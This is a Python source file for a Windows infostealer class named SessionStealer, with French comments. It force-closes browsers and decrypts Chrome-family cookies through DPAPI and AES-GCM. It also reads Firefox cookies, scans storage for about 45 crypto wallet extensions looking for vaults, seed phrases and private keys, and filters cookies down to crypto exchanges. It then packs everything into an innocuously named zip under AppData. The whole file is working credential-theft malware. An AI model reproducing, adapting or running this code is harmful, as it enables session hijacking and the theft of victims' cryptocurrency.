import os
import sys
import json
import sqlite3
import shutil
import base64
import tempfile
import re
import time
import subprocess
import zipfile
from datetime import datetime, timedelta
from Crypto.Cipher import AES
import win32crypt
import win32file
import win32con
import win32api
import psutil  

class SessionStealer:
    def __init__(self):
        self.temp_dir = tempfile.mkdtemp()
        self.results = {
            "cookies": [],
            "wallets": [],
            "local_storage_crypto": []
        }
        self.master_key = None
        self.closed_browsers = []
        
        # Dictionnaire des wallets à cibler (ID d'extension)
        self.target_wallets = {
            "MetaMask": "nkbihfbeogaeaoehlefnkodbefgpgknn",
            "Phantom": "bfnaelmomeimhlpmgjnjophhpkkoljpa",
            "Binance": "fhbohimaelbohpjbbldcngcnapndodjp",
            "Coinbase": "hnfanknocfeofbddgcijnmhnfnkdnaad",
            "TrustWallet": "egjidjbpglichdcondbcbdnbeeppgdph",
            "Ronin": "fnjhmkhhmkbjkkabndcnnogagogbneec",
            "Keplr": "dmkamcknogkgcdfhhbddcghachkejeap",
            "Yoroi": "ffnbelfdoeiohenkjibnmadjiehjhajb",
            "TerraStation": "aiifbnbfobpmeekipheeijimdpnlpgpp",
            "Coin98": "aeachknmefphepccionboohckonkoemg",
            "Slope": "pocmplpaccghoocppoaflocblpmdabjc",
            "Solflare": "bhhhlbepdkbapadjdnnojkbdioheaghc",
            "Martian": "efbglgofoippbgcjepnhiblaibcnclgk",
            "Petra": "ejjladinnckdgjemekebdgebokbggiic",
            "Fewcha": "ebfidpplhabeedjnhkhnlfiablllffjj",
            "MartianWallet": "efbglgofoippbgcjepnhiblaibcnclgk",
            "SuiWallet": "opcgpfmipidbgpenhmajoajpbobppdil",
            "Leap": "fcfkllcphnofkfjjlhnpkhjogdpibjme",
            "Cosmostation": "fpccgekjfbnnliojfdoaoneldooaonek",
            "MathWallet": "afbcbjpbpfadlkmhmclhkeeodmamcflc",
            "TokenPocket": "mfgccjchihfkkindfppnaooecgfneiii",
            "SafePal": "lgmpcpglpngdoalbkknfgphmpmhidhmo",
            "Rabby": "acmacodkjbdgmoleebohhmjkmijkogln",
            "Tally": "hmeobnfnfcmdkdcjblbkgkgmkikjkjck",
            "Frame": "ldcoohedfbjoobgogipfbenmeihdehfk",
            "Zerion": "klghhnkeealcohjjanjjdaeeggmfmlpl",
            "Rainbow": "opfgelmcmbiajamepnmloijbpoleiama",
            "XDEFI": "hmeobnfnfcmdkdcjblbkgkgmkikjkjck",
            "OKX": "mcohilncbfahbmgdjkbpemcciiolgcge",
            "BitKeep": "jiidiaalihmmhddjgbnbgdfflelocpak",
            "TPWallet": "lgmpcpglpngdoalbkknfgphmpmhidhmo",
            "ONTO": "adahhlcenddielggiahbcamfibbapkmp",
            "Safepal": "lgmpcpglpngdoalbkknfgphmpmhidhmo",
            "ImToken": "kmphmfamomajbjmllkbhpdgcpdckdona",
            "ViaWallet": "bhhlbepdkbapadjdnnojkbdioheaghc",
            "Blocto": "hmeobnfnfcmdkdcjblbkgkgmkikjkjck",
            "Nami": "lpfcbjknijpeeillifnkikgncikgfhdo",
            "Gero": "fcfkllcphnofkfjjlhnpkhjogdpibjme",
            "Vespr": "fcfkllcphnofkfjjlhnpkhjogdpibjme",
            "Lode": "fcfkllcphnofkfjjlhnpkhjogdpibjme",
            "NuFi": "fcfkllcphnofkfjjlhnpkhjogdpibjme",
            "Flint": "fcfkllcphnofkfjjlhnpkhjogdpibjme",
            "Eternl": "fcfkllcphnofkfjjlhnpkhjogdpibjme",
            "Typhon": "fcfkllcphnofkfjjlhnpkhjogdpibjme",
            "GeroWallet": "fcfkllcphnofkfjjlhnpkhjogdpibjme"
        }
    
    def chrome_time_to_unix(self, chrome_time):
        """Convertit le temps Chrome (microsecondes depuis 1601) en timestamp Unix (secondes depuis 1970)"""
        if chrome_time is None or chrome_time == 0:
            return int(time.time() + 2592000)
        
        try:
            unix_epoch_chrome = 11644473600000000
            unix_time = (chrome_time - unix_epoch_chrome) // 1000000
            
            if unix_time < time.time():
                return int(time.time() + 2592000)
                
            return unix_time
        except:
            return int(time.time() + 2592000)
    
    def force_close_all_browsers(self):
        """Ferme TOUS les navigateurs de force"""
        print("[+] Fermeture de tous les navigateurs...")
        
        browser_processes = [
            "chrome.exe", "msedge.exe", "brave.exe", "opera.exe",
            "firefox.exe", "iexplore.exe", "vivaldi.exe", "chromium.exe"
        ]
        
        closed_count = 0
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                process_name = proc.info['name'].lower()
                if process_name in browser_processes:
                    pid = proc.info['pid']
                    print(f"  [➜] Fermeture de {process_name} (PID: {pid})")
                    
                    try:
                        parent = psutil.Process(pid)
                        for child in parent.children(recursive=True):
                            child.terminate()
                        parent.terminate()
                        time.sleep(0.5)
                    except:
                        pass
                    
                    if psutil.pid_exists(pid):
                        try:
                            parent = psutil.Process(pid)
                            for child in parent.children(recursive=True):
                                child.kill()
                            parent.kill()
                        except:
                            os.system(f'taskkill /f /pid {pid} >nul 2>&1')
                    
                    self.closed_browsers.append(process_name)
                    closed_count += 1
                    time.sleep(0.2)
                    
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        
        if closed_count > 0:
            print(f"  [✓] {closed_count} navigateurs fermés")
        else:
            print("  [✓] Aucun navigateur ouvert")
        
        time.sleep(2)
    
    def kill_process_tree(self, pid):
        """Tue un processus et tous ses enfants"""
        try:
            parent = psutil.Process(pid)
            children = parent.children(recursive=True)
            
            for child in children:
                try:
                    child.kill()
                except:
                    pass
            
            parent.kill()
            
            gone, alive = psutil.wait_procs(children + [parent], timeout=3)
            return True
        except:
            return False
    
    def get_encryption_key(self, browser_path):
        """Get AES key for Chrome-based browsers on Windows"""
        try:
            local_state = os.path.join(browser_path, "Local State")
            if not os.path.exists(local_state):
                return None
                
            with open(local_state, 'r', encoding='utf-8') as f:
                local_state_data = json.load(f)
            
            encrypted_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return key
        except Exception as e:
            print(f"Erreur clé: {e}")
            return None
    
    def decrypt_chrome_value(self, encrypted_value, key):
        """Decrypt Chrome encrypted values"""
        try:
            if encrypted_value[:3] == b'v10' or encrypted_value[:3] == b'v11':
                nonce = encrypted_value[3:15]
                ciphertext = encrypted_value[15:-16]
                tag = encrypted_value[-16:]
                
                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                return decrypted.decode('utf-8')
            else:
                return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8')
        except Exception as e:
            try:
                cipher = AES.new(key, AES.MODE_GCM, nonce=encrypted_value[3:15])
                return cipher.decrypt(encrypted_value[15:]).decode('utf-8', errors='ignore')
            except:
                return ""
    
    def get_browser_paths(self):
        """Retourne les chemins des navigateurs Windows"""
        return {
            "Chrome": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data",
            "Edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data",
            "Brave": os.path.expanduser("~") + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data",
            "Opera": os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera Stable",
            "Firefox": os.path.expanduser("~") + r"\AppData\Roaming\Mozilla\Firefox\Profiles"
        }
    
    def copy_locked_file(self, source, destination):
        """Copier un fichier même s'il est verrouillé"""
        try:
            shutil.copy2(source, destination)
            return True
        except (PermissionError, OSError):
            try:
                handle = win32file.CreateFile(
                    source,
                    win32file.GENERIC_READ,
                    win32file.FILE_SHARE_READ | win32file.FILE_SHARE_WRITE,
                    None,
                    win32file.OPEN_EXISTING,
                    win32file.FILE_ATTRIBUTE_NORMAL,
                    None
                )
                
                content = win32file.ReadFile(handle, 10*1024*1024)[1]
                win32file.CloseHandle(handle)
                
                with open(destination, 'wb') as f:
                    f.write(content)
                return True
                
            except Exception as e2:
                return False
    
    def extract_chrome_cookies(self, browser_path, browser_name):
        """Extract cookies from Chrome-based browsers on Windows"""
        
        master_key = self.get_encryption_key(browser_path)
        if not master_key:
            print(f"  [!] Impossible de récupérer la clé pour {browser_name}")
            return
        
        profiles = []
        if os.path.exists(browser_path):
            for item in os.listdir(browser_path):
                if item in ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"] or item.startswith("Profile"):
                    profiles.append(item)
        
        if not profiles:
            profiles = ["Default"]
        
        for profile in profiles:
            cookie_paths = [
                os.path.join(browser_path, profile, "Network", "Cookies"),
                os.path.join(browser_path, profile, "Cookies")
            ]
            
            for cookie_db in cookie_paths:
                if os.path.exists(cookie_db):
                    try:
                        temp_db = os.path.join(self.temp_dir, f"{browser_name}_{profile}_cookies.db")
                        
                        if not self.copy_locked_file(cookie_db, temp_db):
                            continue
                        
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        
                        cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='cookies'")
                        if not cursor.fetchone():
                            conn.close()
                            continue
                        
                        cursor.execute("SELECT host_key, name, encrypted_value, expires_utc, path, is_secure, is_httponly FROM cookies")
                        
                        count = 0
                        for row in cursor.fetchall():
                            try:
                                host = row[0]
                                name = row[1]
                                encrypted_value = row[2]
                                expires_chrome = row[3]
                                
                                decrypted = self.decrypt_chrome_value(encrypted_value, master_key)
                                
                                if decrypted and decrypted.strip():
                                    expires_unix = self.chrome_time_to_unix(expires_chrome)
                                    
                                    self.results["cookies"].append({
                                        "browser": browser_name,
                                        "profile": profile,
                                        "domain": host,
                                        "name": name,
                                        "value": decrypted,
                                        "expires": expires_unix,
                                        "expires_original": expires_chrome,
                                        "path": row[4] if len(row) > 4 else "/",
                                        "secure": bool(row[5]) if len(row) > 5 else False,
                                        "httponly": bool(row[6]) if len(row) > 6 else False
                                    })
                                    count += 1
                            except Exception as e:
                                continue
                        
                        conn.close()
                        if count > 0:
                            print(f"  [✓] {browser_name} ({profile}): {count} cookies")
                        
                    except Exception as e:
                        print(f"  [!] Erreur {browser_name}: {e}")
    
    def extract_local_storage_crypto(self, browser_path, browser_name):
        """Extract ONLY crypto-related Local Storage data from Chrome-based browsers"""
        
        profiles = []
        if os.path.exists(browser_path):
            for item in os.listdir(browser_path):
                if item in ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"] or item.startswith("Profile"):
                    profiles.append(item)
        
        if not profiles:
            profiles = ["Default"]
        
        for profile in profiles:
            ls_path = os.path.join(browser_path, profile, "Local Storage", "leveldb")
            
            if os.path.exists(ls_path):
                storage_found = False
                storage_data = {
                    "browser": browser_name,
                    "profile": profile,
                    "path": ls_path,
                    "crypto_entries": []
                }
                
                try:
                    for file in os.listdir(ls_path):
                        if file.endswith('.log') or file.endswith('.ldb'):
                            file_path = os.path.join(ls_path, file)
                            temp_file = os.path.join(self.temp_dir, f"{browser_name}_{profile}_ls_{file}")
                            
                            if self.copy_locked_file(file_path, temp_file):
                                try:
                                    with open(temp_file, 'r', encoding='utf-8', errors='ignore') as f:
                                        content = f.read()
                                        
                                        # Mots-clés crypto uniquement
                                        crypto_keywords = [
                                            'wallet', 'metamask', 'phantom', 'coinbase',     
                                            'binance', 'kraken', 'crypto.com', 'bybit', 'okx',
                                            'kucoin', 'huobi', 'gate.io', 'bitfinex', 'gemini',
                                            'nexo', 'celsius', 'blockfi', 'ledger', 'trezor',
                                            'mnemonic', 'seed', 'private', 'key',
                                            'vault', 'recovery', 'phrase', 'keystore',
                                            'crypto', 'bitcoin', 'ethereum', 'solana',
                                            'bsc', 'polygon', 'avalanche', 'arbitrum',
                                            'nft', 'defi', 'swap', 'bridge', 'liquidity',
                                            'metamask-extension', 'phantom-extension'
                                        ]
                                        
                                        key_value_pairs = re.findall(r'\[\'([^\']+)\',\'([^\']+)\'\]', content)
                                        
                                        for key, value in key_value_pairs:
                                            if key and value and len(value) < 1000:
                                                key_lower = key.lower()
                                                value_lower = value.lower()
                                                
                                                # Vérifier si c'est lié à la crypto
                                                if any(keyword in key_lower or keyword in value_lower for keyword in crypto_keywords):
                                                    entry = {
                                                        "key": key,
                                                        "value": value if len(value) < 200 else value[:200] + "...",
                                                        "value_full": value if len(value) < 500 else value[:500] + "..."
                                                    }
                                                    storage_data["crypto_entries"].append(entry)
                                                    storage_found = True
                                        
                                        # Chercher aussi les objets JSON crypto
                                        json_matches = re.findall(r'\{[^{}]*(?:"[^"]+"\s*:\s*"[^"]*"[^{}]*)*\}', content)
                                        for json_match in json_matches[:5]:
                                            try:
                                                json_data = json.loads(json_match)
                                                json_str = json.dumps(json_data).lower()
                                                
                                                if any(keyword in json_str for keyword in crypto_keywords):
                                                    # Extraire les parties pertinentes du JSON
                                                    relevant_parts = {}
                                                    for key, val in json_data.items():
                                                        key_lower = key.lower()
                                                        val_str = str(val).lower()
                                                        if any(kw in key_lower or kw in val_str for kw in crypto_keywords):
                                                            relevant_parts[key] = val if len(str(val)) < 200 else str(val)[:200] + "..."
                                                    
                                                    if relevant_parts:
                                                        entry = {
                                                            "key": "json_data_crypto",
                                                            "value": json.dumps(relevant_parts)[:300] + "..." if len(json.dumps(relevant_parts)) > 300 else json.dumps(relevant_parts)
                                                        }
                                                        storage_data["crypto_entries"].append(entry)
                                                        storage_found = True
                                            except:
                                                pass
                                        
                                except Exception as e:
                                    continue
                    
                    if storage_found:
                        self.results["local_storage_crypto"].append(storage_data)
                        print(f"  [✓] {browser_name} ({profile}): {len(storage_data['crypto_entries'])} éléments crypto dans Local Storage")
                    
                except Exception as e:
                    print(f"  [!] Erreur Local Storage crypto {browser_name}: {e}")
    
    def extract_firefox_cookies(self):
        """Extract Firefox cookies on Windows"""
        firefox_path = os.path.expanduser("~") + r"\AppData\Roaming\Mozilla\Firefox\Profiles"
        
        if os.path.exists(firefox_path):
            for profile in os.listdir(firefox_path):
                profile_path = os.path.join(firefox_path, profile)
                
                if os.path.isdir(profile_path):
                    cookies_db = os.path.join(profile_path, "cookies.sqlite")
                    if os.path.exists(cookies_db):
                        try:
                            temp_db = os.path.join(self.temp_dir, f"firefox_{profile}_cookies.db")
                            
                            if not self.copy_locked_file(cookies_db, temp_db):
                                continue
                            
                            conn = sqlite3.connect(temp_db)
                            cursor = conn.cursor()
                            
                            cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='moz_cookies'")
                            if cursor.fetchone():
                                cursor.execute("SELECT host, name, value, path, expiry FROM moz_cookies")
                                
                                count = 0
                                for host, name, value, path, expiry in cursor.fetchall():
                                    self.results["cookies"].append({
                                        "browser": "Firefox",
                                        "profile": profile,
                                        "domain": host,
                                        "name": name,
                                        "value": value,
                                        "expires": expiry,
                                        "path": path,
                                        "secure": False,
                                        "httponly": False
                                    })
                                    count += 1
                                
                                if count > 0:
                                    print(f"  [✓] Firefox ({profile}): {count} cookies")
                            
                            conn.close()
                        except Exception as e:
                            print(f"  [!] Erreur Firefox cookies: {e}")
    
    def extract_all_wallets(self):
        """Extract data from all browser-based crypto wallets."""
        print(f"\n[+] Recherche de {len(self.target_wallets)} wallets crypto...")
        
        for wallet_name, extension_id in self.target_wallets.items():
            print(f"  [➜] Analyse {wallet_name}...")
            self.extract_wallet_data(wallet_name, extension_id)
    
    def extract_wallet_data(self, wallet_name, extension_id):
        """Extract wallet data for a given extension ID."""
        paths_to_check = []
        
        browsers_paths = self.get_browser_paths()
        for browser_name, browser_path in browsers_paths.items():
            if browser_name != "Firefox" and os.path.exists(browser_path):
                for item in os.listdir(browser_path):
                    if item in ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"] or item.startswith("Profile"):
                        ext_path = os.path.join(browser_path, item, "Local Extension Settings", extension_id)
                        if os.path.exists(ext_path):
                            paths_to_check.append((browser_name, item, ext_path))
        
        for browser_name, profile, ext_data_path in paths_to_check:
            wallet_found = False
            wallet_data = {
                "wallet": wallet_name,
                "browser": browser_name,
                "profile": profile,
                "path": ext_data_path,
                "files": []
            }
            
            try:
                for file in os.listdir(ext_data_path):
                    if file.endswith('.log') or file.endswith('.ldb') or file.endswith('.db'):
                        file_path = os.path.join(ext_data_path, file)
                        temp_file = os.path.join(self.temp_dir, f"{wallet_name}_{browser_name}_{profile}_{file}")
                        
                        if self.copy_locked_file(file_path, temp_file):
                            try:
                                with open(temp_file, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                    
                                    sensitive_keywords = [
                                        'vault', 'wallet', 'mnemonic', 'seed', 'private', 'key', 
                                        'encrypted', 'cipher', 'data', 'password', 'recovery', 
                                        'phrase', 'keystore', 'crypto', 'address', 'publicKey',
                                        'secret', 'masterkey', 'rootkey', 'hdpath'
                                    ]
                                    
                                    file_data = {
                                        "name": file,
                                        "size": os.path.getsize(file_path),
                                        "sensitive_data": []
                                    }
                                    
                                    for keyword in sensitive_keywords:
                                        if keyword in content.lower():
                                            matches = re.finditer(r'.{0,50}' + keyword + r'.{0,50}', content, re.IGNORECASE)
                                            for match in matches:
                                                file_data["sensitive_data"].append({
                                                    "keyword": keyword,
                                                    "context": match.group()
                                                })
                                    
                                    if file_data["sensitive_data"]:
                                        wallet_data["files"].append(file_data)
                                        wallet_found = True
                                        
                                        json_matches = re.findall(r'\{[^{}]*(?:"vault"|"data"|"wallet"|"mnemonic")[^{}]*\}', content)
                                        for json_match in json_matches[:3]:
                                            try:
                                                json_data = json.loads(json_match)
                                                file_data["json_data"] = json.dumps(json_data)[:500]
                                            except:
                                                pass
                            except Exception as e:
                                continue
                
                if wallet_found:
                    self.results["wallets"].append(wallet_data)
                    print(f"    [✓] Données trouvées pour {wallet_name} dans {browser_name} ({profile}) - {len(wallet_data['files'])} fichiers")
                    
            except Exception as e:
                print(f"    [!] Erreur lors du scan {wallet_name}: {e}")
    
    def save_cookies_by_domain(self):
        """Sauvegarde les cookies dans des fichiers JSON individuels par domaine"""
        domain_groups = {}
        
        for cookie in self.results["cookies"]:
            domain = cookie["domain"]
            if domain.startswith('.'):
                domain = domain[1:]
            
            parts = domain.split('.')
            if len(parts) >= 2:
                main_domain = '.'.join(parts[-2:])
            else:
                main_domain = domain
            
            if main_domain not in domain_groups:
                domain_groups[main_domain] = []
            
            domain_groups[main_domain].append(cookie)
        
        output_dir = os.path.join(self.temp_dir, "cookies_export")
        os.makedirs(output_dir, exist_ok=True)
        
        saved_files = []
        for domain, cookies in domain_groups.items():
            filename = domain.replace('.', '_') + '.json'
            filepath = os.path.join(output_dir, filename)
            
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(cookies, f, indent=2, ensure_ascii=False)
            
            saved_files.append((filename, len(cookies)))
        
        return output_dir, saved_files
    
    def create_zip_archive(self, framework_dir):
        """Crée une archive ZIP avec tous les fichiers JSON"""
        
        # Vérifier que le dossier framework existe
        if not os.path.exists(framework_dir):
            print(f"[!] Dossier framework introuvable: {framework_dir}")
            return None, []
        
        # Créer le dossier cookies_export
        cookies_dir, saved_files = self.save_cookies_by_domain()
        
        # Créer l'archive ZIP dans le dossier framework
        zip_path = os.path.join(framework_dir, 'settings_results.zip')
        
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            # Ajouter les fichiers JSON de cookies
            for filename, _ in saved_files:
                filepath = os.path.join(cookies_dir, filename)
                zipf.write(filepath, filename)
            
            # Ajouter les wallets si disponibles
            if self.results["wallets"]:
                wallets_file = os.path.join(self.temp_dir, 'wallets.json')
                with open(wallets_file, 'w', encoding='utf-8') as f:
                    json.dump(self.results["wallets"], f, indent=2, ensure_ascii=False)
                zipf.write(wallets_file, 'wallets.json')
            
            # Ajouter le local storage crypto si disponible
            if self.results["local_storage_crypto"]:
                local_storage_file = os.path.join(self.temp_dir, 'local_storage_crypto.json')
                with open(local_storage_file, 'w', encoding='utf-8') as f:
                    json.dump(self.results["local_storage_crypto"], f, indent=2, ensure_ascii=False)
                zipf.write(local_storage_file, 'local_storage_crypto.json')
        
        return zip_path, saved_files
    
    def run(self):
        """Main execution"""
        print("[+] Début de l'extraction des données crypto...")
        print("[=" * 30)
        
        # ÉTAPE 1: Fermer TOUS les navigateurs
        self.force_close_all_browsers()
        
        print("\n[=" * 30)
        
        # ÉTAPE 2: Extraire les cookies
        browsers = self.get_browser_paths()
        
        # Chrome et dérivés - Cookies uniquement
        for name, path in browsers.items():
            if name != "Firefox" and os.path.exists(path):
                print(f"\n[+] Extraction des cookies depuis {name}")
                self.extract_chrome_cookies(path, name)
        
        # Firefox - Cookies uniquement
        print(f"\n[+] Extraction des cookies depuis Firefox")
        self.extract_firefox_cookies()
        
        # ÉTAPE 3: Filtrer pour ne garder que les cookies des plateformes crypto
        print(f"\n[+] Filtrage des cookies (garde uniquement plateformes crypto et exchanges)...")
        
        crypto_domains = [
            'binance', 'coinbase', 'kraken', 'crypto.com', 'bybit', 'okx',
            'kucoin', 'huobi', 'gate.io', 'bitfinex', 'gemini', 'nexo',
            'celsius', 'blockfi', 'ledger', 'trezor'
        ]
        
        filtered_cookies = []
        filtered_count = 0
        removed_count = 0
        
        for cookie in self.results["cookies"]:
            domain_lower = cookie['domain'].lower()
            keep = any(domain in domain_lower for domain in crypto_domains)
            
            if keep:
                filtered_cookies.append(cookie)
                filtered_count += 1
            else:
                removed_count += 1
        
        self.results["cookies"] = filtered_cookies
        
        print(f"  [✓] {filtered_count} cookies crypto gardés")
        print(f"  [➜] {removed_count} cookies supprimés (autres sites)")
        
        # ÉTAPE 4: Extraire tous les wallets crypto
        print(f"\n[+] Extraction des wallets crypto")
        self.extract_all_wallets()
        
        # ÉTAPE 5: Extraire le Local Storage crypto
        print(f"\n[+] Extraction du Local Storage crypto")
        for name, path in browsers.items():
            if name != "Firefox" and os.path.exists(path):
                print(f"\n[+] Local Storage crypto depuis {name}")
                self.extract_local_storage_crypto(path, name)
        
        # ÉTAPE 6: Dossier framework
        framework_dir = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'framework')
        
        # Création de l'archive ZIP
        zip_path, saved_files = self.create_zip_archive(framework_dir)
        
        print("\n" + "[=" * 30)
        print(f"\n[+] Extraction crypto terminée!")
        print(f"[+] Navigateurs fermés: {', '.join(set(self.closed_browsers)) if self.closed_browsers else 'aucun'}")
        print(f"[+] Cookies crypto gardés: {len(self.results['cookies'])}")
        print(f"[+] Wallets crypto trouvés: {len(self.results['wallets'])}")
        print(f"[+] Local Storage crypto trouvé: {len(self.results['local_storage_crypto'])}")
        
        # Afficher les fichiers JSON générés
        if saved_files:
            print("\n[+] Fichiers JSON cookies par domaine crypto:")
            for filename, count in sorted(saved_files, key=lambda x: x[0]):
                print(f"  {filename}: {count} cookies")
        
        # Détail par wallet
        if self.results["wallets"]:
            wallet_counts = {}
            for wallet in self.results["wallets"]:
                name = wallet["wallet"]
                if name not in wallet_counts:
                    wallet_counts[name] = 0
                wallet_counts[name] += 1
            
            print("\n[+] Détail par wallet crypto:")
            for name, count in sorted(wallet_counts.items(), key=lambda x: x[1], reverse=True):
                print(f"  {name}: {count} installation(s)")
        
        if zip_path:
            print(f"\n[+] Archive ZIP créée dans: {zip_path}")
        else:
            print(f"\n[!] Impossible de créer l'archive ZIP (dossier framework manquant)")
        
        return self.results

if __name__ == "__main__":
    # Installation de psutil si nécessaire
    try:
        import psutil
    except ImportError:
        print("[!] Installation de psutil...")
        os.system('pip install psutil')
        import psutil
    
    try:
        stealer = SessionStealer()
        data = stealer.run()
    except Exception as e:
        print(f"[-] Erreur: {e}")
        import traceback
        traceback.print_exc()
    
    input("\nAppuyez sur Entrée pour quitter...")